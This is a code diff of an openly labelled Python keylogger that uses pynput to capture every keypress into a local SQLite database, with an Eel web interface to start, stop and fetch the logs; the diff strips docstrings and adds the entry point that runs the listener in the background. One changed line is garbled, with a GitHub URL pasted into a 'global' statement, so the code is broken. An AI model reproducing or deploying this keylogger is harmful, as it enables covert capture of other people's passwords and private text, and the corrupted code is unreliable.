@@ -1,10 +1,5 @@
 """
 Keylogger Application (Expanded Version)
-
-This script initializes a keylogger using the pynput library and logs all keypress events to a local SQLite database.
-It also uses the Eel library to interact with a frontend UI built in HTML/JS/CSS.
-
-Author: Original Author (expanded by ChatGPT)
 """
 
 import eel
@@ -34,7 +29,6 @@ logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s:%
 # ==========================
 
 def setup_database():
-    """Initializes the SQLite database and creates the keystrokes table if it doesn't exist."""
     try:
         conn = sqlite3.connect(DATABASE_PATH)
         cursor = conn.cursor()
@@ -57,7 +51,6 @@ def setup_database():
 # ==========================
 
 def log_keystroke(keystroke: str):
-    """Logs a single keystroke to the database."""
     try:
         conn = sqlite3.connect(DATABASE_PATH)
         cursor = conn.cursor()
@@ -73,7 +66,6 @@ def log_keystroke(keystroke: str):
         conn.close()
 
 def on_press(key):
-    """Callback for key press events."""
     if is_logging:
         try:
             keystroke = key.char
@@ -87,21 +79,18 @@ def on_press(key):
 
 @eel.expose
 def start_logging():
-    """Starts the keylogging session."""
     global is_logging
     is_logging = True
     logging.info("Keylogging started.")
 
 @eel.expose
 def stop_logging():
-    """Stops the keylogging session."""
-    global is_logging
+    global is_logginghttps://github.com/tanmaylmao/Keylogger/blob/main/ne3w
     is_logging = False
     logging.info("Keylogging stopped.")
 
 @eel.expose
 def fetch_keystrokes():
-    """Fetches all logged keystrokes from the database."""
     try:
         conn = sqlite3.connect(DATABASE_PATH)
         cursor = conn.cursor()
@@ -109,4 +98,26 @@ def fetch_keystrokes():
         results = cursor.fetchall()
         return results
     except Exception as e:
-        logging.error(f"Error fetching ke
+        logging.error(f"Error fetching keystrokes: {e}")
+        return []
+    finally:
+        conn.close()
+
+# ==========================
+# Application Entry Point
+# ==========================
+
+def main():
+    setup_database()
+    eel.init('web')
+
+    # Start key listener in background (daemon ensures it exits with main program)
+    listener = keyboard.Listener(on_press=on_press)
+    listener.daemon = True
+    listener.start()
+
+    # Start Eel app (blocks main thread)
+    eel.start('index.html', size=(800, 600))
+
+if __name__ == '__main__':
+    main()
